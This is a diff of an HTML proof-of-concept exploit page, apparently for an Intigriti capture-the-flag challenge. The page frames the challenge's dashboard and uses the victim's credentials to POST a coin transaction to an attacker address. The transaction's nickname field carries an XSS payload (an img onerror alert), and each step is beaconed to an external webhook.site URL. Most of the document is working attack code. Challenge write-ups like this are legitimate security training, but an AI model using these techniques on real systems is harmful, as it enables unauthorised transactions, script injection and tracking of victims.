@@ -2,17 +2,19 @@
 <html>
 <head><title>PoC</title></head>
 <body>
-<h1>Loading...</h1>
-<img src="https://webhook.site/bcf23067-6898-4c8d-9741-26589bcc4876">
-<iframe id="f" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:400px"></iframe>
+<h1>XSS PoC</h1>
+
+<!-- Webhook tracking -->
+<img src="https://webhook.site/f81ce1a4-789f-4cea-b6f0-034c966c4049/?step=started">
+
+<!-- Load dashboard in iframe to get same-origin access -->
+<iframe id="f" src="https://challenge-0126.intigriti.io/dashboard.html" style="width:100%;height:400px"></iframe>
+
 <script>
 const BASE = 'https://challenge-0126.intigriti.io';
 const WEBHOOK = 'https://webhook.site/f81ce1a4-789f-4cea-b6f0-034c966c4049';
 const YOUR_ADDRESS = '1cc4a7735c998cb4b4e390e97c349281d2';
 const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';
-
-// Log start
-new Image().src = WEBHOOK + '/?step=started';
 
 const f = document.getElementById('f');
 
@@ -20,27 +22,39 @@ f.onload = function() {
   new Image().src = WEBHOOK + '/?step=iframe_loaded';
 
   setTimeout(function() {
-    new Image().src = WEBHOOK + '/?step=sending_tx';
+    try {
+      // Access iframe's window and make API call from same origin
+      const win = f.contentWindow;
 
-    // Send transaction to your address
-    f.contentWindow.postMessage({
-      type: 'submitTransaction',
-      transaction: {
-        toAddress: YOUR_ADDRESS,
-        currency: '1337COIN',
-        amount: 1,
-        nickname: XSS_PAYLOAD
-      }
-    }, '*');
+      // Direct API call with nickname
+      win.fetch('/api/transaction', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        credentials: 'include',
+        body: JSON.stringify({
+          toAddress: YOUR_ADDRESS,
+          currency: '1337COIN',
+          amount: 2,
+          nickname: XSS_PAYLOAD
+        })
+      }).then(function(r) {
+        new Image().src = WEBHOOK + '/?step=tx_status_' + r.status;
 
-    new Image().src = WEBHOOK + '/?step=tx_sent';
+        // Redirect to marketwatch after transaction
+        setTimeout(function() {
+          new Image().src = WEBHOOK + '/?step=redirecting';
+          window.location = BASE + '/marketwatch.html';
+        }, 1000);
+      }).catch(function(e) {
+        new Image().src = WEBHOOK + '/?step=error_' + encodeURIComponent(e.message);
+      });
 
-    // Redirect after delay
-    setTimeout(function() {
-      new Image().src = WEBHOOK + '/?step=redirecting';
-      window.location = BASE + '/marketwatch.html';
-    }, 3000);
-  }, 4000);
+      new Image().src = WEBHOOK + '/?step=api_called';
+
+    } catch (e) {
+      new Image().src = WEBHOOK + '/?step=catch_' + encodeURIComponent(e.message);
+    }
+  }, 2000);
 };
 </script>
 </body>
